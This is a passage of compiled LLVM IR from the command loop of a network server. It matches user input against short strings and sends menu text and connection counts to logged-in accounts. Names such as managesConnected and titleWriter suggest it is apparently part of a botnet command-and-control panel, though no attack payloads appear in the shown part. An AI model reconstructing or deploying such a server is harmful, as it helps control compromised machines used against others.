  %343 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %344 = call i8* @strstr(i8* %343, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0)) #8
  %345 = icmp ne i8* %344, null
  br i1 %345, label %358, label %346

; <label>:346:                                    ; preds = %342
  %347 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %348 = call i8* @strstr(i8* %347, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0)) #8
  %349 = icmp ne i8* %348, null
  br i1 %349, label %358, label %350

; <label>:350:                                    ; preds = %346
  %351 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %352 = call i8* @strstr(i8* %351, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #8
  %353 = icmp ne i8* %352, null
  br i1 %353, label %358, label %354

; <label>:354:                                    ; preds = %350
  %355 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %356 = call i8* @strstr(i8* %355, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i32 0, i32 0)) #8
  %357 = icmp ne i8* %356, null
  br i1 %357, label %358, label %371

; <label>:358:                                    ; preds = %354, %350, %346, %342
  %359 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %360 = call i32 @clientsConnected()
  %361 = load volatile i32, i32* @managesConnected, align 4
  %362 = call i32 (i8*, i8*, ...) @sprintf(i8* %359, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str.34, i32 0, i32 0), i32 %360, i32 %361) #7
  %363 = load i32, i32* %4, align 4
  %364 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %365 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %366 = call i64 @strlen(i8* %365) #8
  %367 = call i64 @send(i32 %363, i8* %364, i64 %366, i32 16384)
  %368 = icmp eq i64 %367, -1
  br i1 %368, label %369, label %370

; <label>:369:                                    ; preds = %358
  br label %370

; <label>:370:                                    ; preds = %369, %358
  br label %371

; <label>:371:                                    ; preds = %370, %354
  %372 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %373 = call i8* @strstr(i8* %372, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0)) #8
  %374 = icmp ne i8* %373, null
  br i1 %374, label %383, label %375

; <label>:375:                                    ; preds = %371
  %376 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %377 = call i8* @strstr(i8* %376, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #8
  %378 = icmp ne i8* %377, null
  br i1 %378, label %383, label %379

; <label>:379:                                    ; preds = %375
  %380 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %381 = call i8* @strstr(i8* %380, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0)) #8
  %382 = icmp ne i8* %381, null
  br i1 %382, label %383, label %514

; <label>:383:                                    ; preds = %379, %375, %371
  %384 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %385 = call i32 (i8*, i8*, ...) @sprintf(i8* %384, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i32 0, i32 0)) #7
  %386 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %387 = call i32 (i8*, i8*, ...) @sprintf(i8* %386, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %388 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %389 = call i32 (i8*, i8*, ...) @sprintf(i8* %388, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.40, i32 0, i32 0)) #7
  %390 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %391 = call i32 (i8*, i8*, ...) @sprintf(i8* %390, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.41, i32 0, i32 0)) #7
  %392 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %393 = call i32 (i8*, i8*, ...) @sprintf(i8* %392, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.42, i32 0, i32 0)) #7
  %394 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %395 = call i32 (i8*, i8*, ...) @sprintf(i8* %394, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.43, i32 0, i32 0)) #7
  %396 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %397 = call i32 (i8*, i8*, ...) @sprintf(i8* %396, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.44, i32 0, i32 0)) #7
  %398 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %399 = call i32 (i8*, i8*, ...) @sprintf(i8* %398, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.45, i32 0, i32 0)) #7
  %400 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %401 = call i32 (i8*, i8*, ...) @sprintf(i8* %400, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.46, i32 0, i32 0)) #7
  %402 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %403 = call i32 (i8*, i8*, ...) @sprintf(i8* %402, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.47, i32 0, i32 0)) #7
  %404 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i32 0, i32 0
  %405 = call i32 (i8*, i8*, ...) @sprintf(i8* %404, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %406 = load i32, i32* %4, align 4
  %407 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %408 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %409 = call i64 @strlen(i8* %408) #8
  %410 = call i64 @send(i32 %406, i8* %407, i64 %409, i32 16384)
  %411 = icmp eq i64 %410, -1
  br i1 %411, label %412, label %413

; <label>:412:                                    ; preds = %383
  br label %2101

; <label>:413:                                    ; preds = %383
  %414 = load i32, i32* %4, align 4
  %415 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %416 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %417 = call i64 @strlen(i8* %416) #8
  %418 = call i64 @send(i32 %414, i8* %415, i64 %417, i32 16384)
  %419 = icmp eq i64 %418, -1
  br i1 %419, label %420, label %421

; <label>:420:                                    ; preds = %413
  br label %2101

; <label>:421:                                    ; preds = %413
  %422 = load i32, i32* %4, align 4
  %423 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %424 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %425 = call i64 @strlen(i8* %424) #8
  %426 = call i64 @send(i32 %422, i8* %423, i64 %425, i32 16384)
  %427 = icmp eq i64 %426, -1
  br i1 %427, label %428, label %429

; <label>:428:                                    ; preds = %421
  br label %2101

; <label>:429:                                    ; preds = %421
  %430 = load i32, i32* %4, align 4
  %431 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %432 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %433 = call i64 @strlen(i8* %432) #8
  %434 = call i64 @send(i32 %430, i8* %431, i64 %433, i32 16384)
  %435 = icmp eq i64 %434, -1
  br i1 %435, label %436, label %437

; <label>:436:                                    ; preds = %429
  br label %2101

; <label>:437:                                    ; preds = %429
  %438 = load i32, i32* %4, align 4
  %439 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %440 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %441 = call i64 @strlen(i8* %440) #8
  %442 = call i64 @send(i32 %438, i8* %439, i64 %441, i32 16384)
  %443 = icmp eq i64 %442, -1
  br i1 %443, label %444, label %445

; <label>:444:                                    ; preds = %437
  br label %2101

; <label>:445:                                    ; preds = %437
  %446 = load i32, i32* %4, align 4
  %447 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %448 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %449 = call i64 @strlen(i8* %448) #8
  %450 = call i64 @send(i32 %446, i8* %447, i64 %449, i32 16384)
  %451 = icmp eq i64 %450, -1
  br i1 %451, label %452, label %453

; <label>:452:                                    ; preds = %445
  br label %2101

; <label>:453:                                    ; preds = %445
  %454 = load i32, i32* %4, align 4
  %455 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %456 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %457 = call i64 @strlen(i8* %456) #8
  %458 = call i64 @send(i32 %454, i8* %455, i64 %457, i32 16384)
  %459 = icmp eq i64 %458, -1
  br i1 %459, label %460, label %461

; <label>:460:                                    ; preds = %453
  br label %2101

; <label>:461:                                    ; preds = %453
  %462 = load i32, i32* %4, align 4
  %463 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %464 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %465 = call i64 @strlen(i8* %464) #8
  %466 = call i64 @send(i32 %462, i8* %463, i64 %465, i32 16384)
  %467 = icmp eq i64 %466, -1
  br i1 %467, label %468, label %469

; <label>:468:                                    ; preds = %461
  br label %2101

; <label>:469:                                    ; preds = %461
  %470 = load i32, i32* %4, align 4
  %471 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %472 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %473 = call i64 @strlen(i8* %472) #8
  %474 = call i64 @send(i32 %470, i8* %471, i64 %473, i32 16384)
  %475 = icmp eq i64 %474, -1
  br i1 %475, label %476, label %477

; <label>:476:                                    ; preds = %469
  br label %2101

; <label>:477:                                    ; preds = %469
  %478 = load i32, i32* %4, align 4
  %479 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %480 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %481 = call i64 @strlen(i8* %480) #8
  %482 = call i64 @send(i32 %478, i8* %479, i64 %481, i32 16384)
  %483 = icmp eq i64 %482, -1
  br i1 %483, label %484, label %485

; <label>:484:                                    ; preds = %477
  br label %2101

; <label>:485:                                    ; preds = %477
  %486 = load i32, i32* %4, align 4
  %487 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i32 0, i32 0
  %488 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i32 0, i32 0
  %489 = call i64 @strlen(i8* %488) #8
  %490 = call i64 @send(i32 %486, i8* %487, i64 %489, i32 16384)
  %491 = icmp eq i64 %490, -1
  br i1 %491, label %492, label %493

; <label>:492:                                    ; preds = %485
  br label %2101

; <label>:493:                                    ; preds = %485
  %494 = load i8*, i8** %3, align 8
  %495 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %494) #7
  br label %496

; <label>:496:                                    ; preds = %493
  %497 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %498 = load i32, i32* %5, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %499
  %501 = getelementptr inbounds %struct.account, %struct.account* %500, i32 0, i32 0
  %502 = getelementptr inbounds [20 x i8], [20 x i8]* %501, i32 0, i32 0
  %503 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %504 = call i32 (i8*, i8*, ...) @sprintf(i8* %497, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %502, i8* %503) #7
  %505 = load i32, i32* %4, align 4
  %506 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %507 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %508 = call i64 @strlen(i8* %507) #8
  %509 = call i64 @send(i32 %505, i8* %506, i64 %508, i32 16384)
  %510 = icmp eq i64 %509, -1
  br i1 %510, label %511, label %512

; <label>:511:                                    ; preds = %496
  br label %2101

; <label>:512:                                    ; preds = %496
  br label %513

; <label>:513:                                    ; preds = %512
  br label %337

; <label>:514:                                    ; preds = %379
  %515 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %516 = call i8* @strstr(i8* %515, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.48, i32 0, i32 0)) #8
  %517 = icmp ne i8* %516, null
  br i1 %517, label %530, label %518

; <label>:518:                                    ; preds = %514
  %519 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %520 = call i8* @strstr(i8* %519, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.49, i32 0, i32 0)) #8
  %521 = icmp ne i8* %520, null
  br i1 %521, label %530, label %522

; <label>:522:                                    ; preds = %518
  %523 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %524 = call i8* @strstr(i8* %523, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i32 0, i32 0)) #8
  %525 = icmp ne i8* %524, null
  br i1 %525, label %530, label %526

; <label>:526:                                    ; preds = %522
  %527 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %528 = call i8* @strstr(i8* %527, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0)) #8
  %529 = icmp ne i8* %528, null
  br i1 %529, label %530, label %621

; <label>:530:                                    ; preds = %526, %522, %518, %514
  %531 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %532 = call i32 (i8*, i8*, ...) @sprintf(i8* %531, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.52, i32 0, i32 0)) #7
  %533 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i32 0, i32 0
  %534 = call i32 (i8*, i8*, ...) @sprintf(i8* %533, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %535 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i32 0, i32 0
  %536 = call i32 (i8*, i8*, ...) @sprintf(i8* %535, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.53, i32 0, i32 0)) #7
  %537 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i32 0, i32 0
  %538 = call i32 (i8*, i8*, ...) @sprintf(i8* %537, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.54, i32 0, i32 0)) #7
  %539 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i32 0, i32 0
  %540 = call i32 (i8*, i8*, ...) @sprintf(i8* %539, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.55, i32 0, i32 0)) #7
  %541 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i32 0, i32 0
  %542 = call i32 (i8*, i8*, ...) @sprintf(i8* %541, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.56, i32 0, i32 0)) #7
  %543 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %544 = call i32 (i8*, i8*, ...) @sprintf(i8* %543, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %545 = load i32, i32* %4, align 4
  %546 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %547 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %548 = call i64 @strlen(i8* %547) #8
  %549 = call i64 @send(i32 %545, i8* %546, i64 %548, i32 16384)
  %550 = icmp eq i64 %549, -1
  br i1 %550, label %551, label %552

; <label>:551:                                    ; preds = %530
  br label %2101

; <label>:552:                                    ; preds = %530
  %553 = load i32, i32* %4, align 4
  %554 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i32 0, i32 0
  %555 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i32 0, i32 0
  %556 = call i64 @strlen(i8* %555) #8
  %557 = call i64 @send(i32 %553, i8* %554, i64 %556, i32 16384)
  %558 = icmp eq i64 %557, -1
  br i1 %558, label %559, label %560

; <label>:559:                                    ; preds = %552
  br label %2101

; <label>:560:                                    ; preds = %552
  %561 = load i32, i32* %4, align 4
  %562 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i32 0, i32 0
  %563 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i32 0, i32 0
  %564 = call i64 @strlen(i8* %563) #8
  %565 = call i64 @send(i32 %561, i8* %562, i64 %564, i32 16384)
  %566 = icmp eq i64 %565, -1
  br i1 %566, label %567, label %568

; <label>:567:                                    ; preds = %560
  br label %2101

; <label>:568:                                    ; preds = %560
  %569 = load i32, i32* %4, align 4
  %570 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i32 0, i32 0
  %571 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i32 0, i32 0
  %572 = call i64 @strlen(i8* %571) #8
  %573 = call i64 @send(i32 %569, i8* %570, i64 %572, i32 16384)
  %574 = icmp eq i64 %573, -1
  br i1 %574, label %575, label %576

; <label>:575:                                    ; preds = %568
  br label %2101

; <label>:576:                                    ; preds = %568
  %577 = load i32, i32* %4, align 4
  %578 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i32 0, i32 0
  %579 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i32 0, i32 0
  %580 = call i64 @strlen(i8* %579) #8
  %581 = call i64 @send(i32 %577, i8* %578, i64 %580, i32 16384)
  %582 = icmp eq i64 %581, -1
  br i1 %582, label %583, label %584

; <label>:583:                                    ; preds = %576
  br label %2101

; <label>:584:                                    ; preds = %576
  %585 = load i32, i32* %4, align 4
  %586 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i32 0, i32 0
  %587 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i32 0, i32 0
  %588 = call i64 @strlen(i8* %587) #8
  %589 = call i64 @send(i32 %585, i8* %586, i64 %588, i32 16384)
  %590 = icmp eq i64 %589, -1
  br i1 %590, label %591, label %592

; <label>:591:                                    ; preds = %584
  br label %2101

; <label>:592:                                    ; preds = %584
  %593 = load i32, i32* %4, align 4
  %594 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %595 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %596 = call i64 @strlen(i8* %595) #8
  %597 = call i64 @send(i32 %593, i8* %594, i64 %596, i32 16384)
  %598 = icmp eq i64 %597, -1
  br i1 %598, label %599, label %600

; <label>:599:                                    ; preds = %592
  br label %2101

; <label>:600:                                    ; preds = %592
  %601 = load i8*, i8** %3, align 8
  %602 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %601) #7
  br label %603

; <label>:603:                                    ; preds = %600
  %604 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %605 = load i32, i32* %5, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %606
  %608 = getelementptr inbounds %struct.account, %struct.account* %607, i32 0, i32 0
  %609 = getelementptr inbounds [20 x i8], [20 x i8]* %608, i32 0, i32 0
  %610 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %611 = call i32 (i8*, i8*, ...) @sprintf(i8* %604, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %609, i8* %610) #7
  %612 = load i32, i32* %4, align 4
  %613 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %614 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %615 = call i64 @strlen(i8* %614) #8
  %616 = call i64 @send(i32 %612, i8* %613, i64 %615, i32 16384)
  %617 = icmp eq i64 %616, -1
  br i1 %617, label %618, label %619

; <label>:618:                                    ; preds = %603
  br label %2101

; <label>:619:                                    ; preds = %603
  br label %620

; <label>:620:                                    ; preds = %619
  br label %337

; <label>:621:                                    ; preds = %526
  %622 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %623 = call i8* @strstr(i8* %622, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.57, i32 0, i32 0)) #8
  %624 = icmp ne i8* %623, null
  br i1 %624, label %637, label %625

; <label>:625:                                    ; preds = %621
  %626 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %627 = call i8* @strstr(i8* %626, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0)) #8
  %628 = icmp ne i8* %627, null
  br i1 %628, label %637, label %629

; <label>:629:                                    ; preds = %625
  %630 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %631 = call i8* @strstr(i8* %630, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0)) #8
  %632 = icmp ne i8* %631, null
  br i1 %632, label %637, label %633

; <label>:633:                                    ; preds = %629
  %634 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %635 = call i8* @strstr(i8* %634, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.60, i32 0, i32 0)) #8
  %636 = icmp ne i8* %635, null
  br i1 %636, label %637, label %740

; <label>:637:                                    ; preds = %633, %629, %625, %621
  %638 = load i8*, i8** %3, align 8
  %639 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %638) #7
  %640 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i32 0, i32 0
  %641 = call i32 (i8*, i8*, ...) @sprintf(i8* %640, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.61, i32 0, i32 0)) #7
  %642 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %643 = call i32 (i8*, i8*, ...) @sprintf(i8* %642, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %644 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
  %645 = call i32 (i8*, i8*, ...) @sprintf(i8* %644, i8* getelementptr inbounds ([114 x i8], [114 x i8]* @.str.62, i32 0, i32 0)) #7
  %646 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i32 0, i32 0
  %647 = call i32 (i8*, i8*, ...) @sprintf(i8* %646, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.63, i32 0, i32 0)) #7
  %648 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %649 = call i32 (i8*, i8*, ...) @sprintf(i8* %648, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.64, i32 0, i32 0)) #7
  %650 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i32 0, i32 0
  %651 = call i32 (i8*, i8*, ...) @sprintf(i8* %650, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.65, i32 0, i32 0)) #7
  %652 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i32 0, i32 0
  %653 = call i32 (i8*, i8*, ...) @sprintf(i8* %652, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.66, i32 0, i32 0)) #7
  %654 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i32 0, i32 0
  %655 = call i32 (i8*, i8*, ...) @sprintf(i8* %654, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %656 = load i32, i32* %4, align 4
  %657 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i32 0, i32 0
  %658 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i32 0, i32 0
  %659 = call i64 @strlen(i8* %658) #8
  %660 = call i64 @send(i32 %656, i8* %657, i64 %659, i32 16384)
  %661 = icmp eq i64 %660, -1
  br i1 %661, label %662, label %663

; <label>:662:                                    ; preds = %637
  br label %2101

; <label>:663:                                    ; preds = %637
  %664 = load i32, i32* %4, align 4
  %665 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %666 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %667 = call i64 @strlen(i8* %666) #8
  %668 = call i64 @send(i32 %664, i8* %665, i64 %667, i32 16384)
  %669 = icmp eq i64 %668, -1
  br i1 %669, label %670, label %671

; <label>:670:                                    ; preds = %663
  br label %2101

; <label>:671:                                    ; preds = %663
  %672 = load i32, i32* %4, align 4
  %673 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
  %674 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
  %675 = call i64 @strlen(i8* %674) #8
  %676 = call i64 @send(i32 %672, i8* %673, i64 %675, i32 16384)
  %677 = icmp eq i64 %676, -1
  br i1 %677, label %678, label %679

; <label>:678:                                    ; preds = %671
  br label %2101

; <label>:679:                                    ; preds = %671
  %680 = load i32, i32* %4, align 4
  %681 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i32 0, i32 0
  %682 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i32 0, i32 0
  %683 = call i64 @strlen(i8* %682) #8
  %684 = call i64 @send(i32 %680, i8* %681, i64 %683, i32 16384)
  %685 = icmp eq i64 %684, -1
  br i1 %685, label %686, label %687

; <label>:686:                                    ; preds = %679
  br label %2101

; <label>:687:                                    ; preds = %679
  %688 = load i32, i32* %4, align 4
  %689 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %690 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %691 = call i64 @strlen(i8* %690) #8
  %692 = call i64 @send(i32 %688, i8* %689, i64 %691, i32 16384)
  %693 = icmp eq i64 %692, -1
  br i1 %693, label %694, label %695

; <label>:694:                                    ; preds = %687
  br label %2101

; <label>:695:                                    ; preds = %687
  %696 = load i32, i32* %4, align 4
  %697 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i32 0, i32 0
  %698 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i32 0, i32 0
  %699 = call i64 @strlen(i8* %698) #8
  %700 = call i64 @send(i32 %696, i8* %697, i64 %699, i32 16384)
  %701 = icmp eq i64 %700, -1
  br i1 %701, label %702, label %703

; <label>:702:                                    ; preds = %695
  br label %2101

; <label>:703:                                    ; preds = %695
  %704 = load i32, i32* %4, align 4
  %705 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i32 0, i32 0
  %706 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i32 0, i32 0
  %707 = call i64 @strlen(i8* %706) #8
  %708 = call i64 @send(i32 %704, i8* %705, i64 %707, i32 16384)
  %709 = icmp eq i64 %708, -1
  br i1 %709, label %710, label %711

; <label>:710:                                    ; preds = %703
  br label %2101

; <label>:711:                                    ; preds = %703
  %712 = load i32, i32* %4, align 4
  %713 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i32 0, i32 0
  %714 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i32 0, i32 0
  %715 = call i64 @strlen(i8* %714) #8
  %716 = call i64 @send(i32 %712, i8* %713, i64 %715, i32 16384)
  %717 = icmp eq i64 %716, -1
  br i1 %717, label %718, label %719

; <label>:718:                                    ; preds = %711
  br label %2101

; <label>:719:                                    ; preds = %711
  %720 = load i8*, i8** %3, align 8
  %721 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %720) #7
  br label %722

; <label>:722:                                    ; preds = %719
  %723 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %724 = load i32, i32* %5, align 4
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %725
  %727 = getelementptr inbounds %struct.account, %struct.account* %726, i32 0, i32 0
  %728 = getelementptr inbounds [20 x i8], [20 x i8]* %727, i32 0, i32 0
  %729 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %730 = call i32 (i8*, i8*, ...) @sprintf(i8* %723, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %728, i8* %729) #7
  %731 = load i32, i32* %4, align 4
  %732 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %733 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %734 = call i64 @strlen(i8* %733) #8
  %735 = call i64 @send(i32 %731, i8* %732, i64 %734, i32 16384)
  %736 = icmp eq i64 %735, -1
  br i1 %736, label %737, label %738

; <label>:737:                                    ; preds = %722
  br label %2101

; <label>:738:                                    ; preds = %722
  br label %739

; <label>:739:                                    ; preds = %738
  br label %337

; <label>:740:                                    ; preds = %633
  %741 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %742 = call i8* @strstr(i8* %741, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #8
